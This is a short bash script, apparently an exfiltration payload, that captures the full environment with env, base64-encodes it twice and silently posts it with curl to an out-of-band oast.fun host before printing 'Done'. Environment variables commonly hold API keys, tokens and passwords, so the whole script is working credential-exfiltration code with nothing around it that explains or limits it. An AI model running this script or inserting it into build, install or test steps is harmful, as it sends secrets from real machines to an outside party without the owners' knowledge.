#!/bin/bash

B64_BLOB=`env | base64 | base64`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null

echo "Done"